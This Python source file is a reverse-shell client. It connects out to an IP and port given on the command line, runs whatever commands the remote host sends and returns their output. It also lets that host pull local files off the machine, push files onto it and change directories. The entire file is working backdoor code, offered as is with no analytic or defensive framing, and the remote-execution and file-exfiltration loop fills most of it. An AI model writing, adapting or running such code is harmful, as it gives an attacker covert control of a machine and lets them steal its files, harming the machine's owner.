import sys
import json
import socket
import os
from ExecuteTerminal import TermialExecutor

byt = 1024 * 10

terminal = TermialExecutor()


# message Generator
def generate_Message(command):
    try:
        jsondata = json.dumps(command)
        return jsondata.encode()
    except Exception as ex:
        print(f"[-] generate message error :{str(ex)}")
        return ""


# send message
def send_Message(clientsocket: socket.socket, command):
    try:
        clientsocket.send(generate_Message(command))
    except Exception as ex:
        print(f"[-]SOMETHING WENT WRONG WHILE SENDING MESSAGE :{str(ex)}")


# received_Message
def receive_Message(clientsocket: socket.socket):
    data = ""
    while True:
        try:
            data = data + clientsocket.recv(byt).decode().rstrip()
            return json.loads(data)
        except socket.error:
            print(f"[-] CONNECTION CLOSED")
            exit()
        except Exception as ex:
            print(f"[-]SOMETHING WENT WRONG WHILE RECEIVING MESSAGE:{str(ex)}")
            exit()


# upload a file
def upload_File(file_name, clientsocket):
    try:
        fd = open(file_name, "rb")
        content = fd.read().decode()
        send_Message(clientsocket, content)
        fd.close()
    except Exception as ex:
        print(f"[-] File upload error {str(ex)}")
        send_Message(clientsocket, str(ex))


# download file
def download_file(filename, clientsocket: socket.socket):
    try:
        filecontent = receive_Message(clientsocket)
        fd = open(filename, "wb")
        fd.write(filecontent.encode())
        fd.close()
    except Exception as ex:
        print(f"[-] File upload error {str(ex)}")


def main():
    if len(sys.argv) != 3:
        print("[+] Usage python ./server.py IP PORT")
        print("[+] Example python ./server.py 192.168.0.151 8000")
        return
    # EXTRACT IP_ADDRESS
    IP_ADDRESS = sys.argv[1]
    PORT = int(sys.argv[2])
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP_ADDRESS, PORT))
        while True:
            command = receive_Message(sock)
            print(f"[+] COMMAND:~>{command}")
            if command == "quit":
                exit()

            # upload file when the server presses download
            if command[0:8] == "download":
                upload_File(command[9:], sock)
                print("[+]Done Uploading..")
                continue

            if command[0:6] == "upload":
                download_file(command[7:], sock)
                print("[+]Done Downloading..")
                continue

            # change directory
            if command[0:3] == "cd ":
                directory = command[3:].strip()
                try:
                    os.chdir(directory)
                    print("Current directory:", os.getcwd())
                    send_Message(sock, os.getcwd())
                except Exception as ex:
                    print("Directory change failed:", str(ex))
                    send_Message(sock, str(ex))
                continue
            # EXECUTE THE COMMAND
            result = terminal.execute(command)
            send_Message(sock, result)
    except socket.error as ex:
        print(f"[-]SOcket Error :{str(ex)}")
        exit()
    except Exception as ex:
        print(f"[-] Error :{str(ex)}")
        exit()


if __name__ == "__main__":
    main()
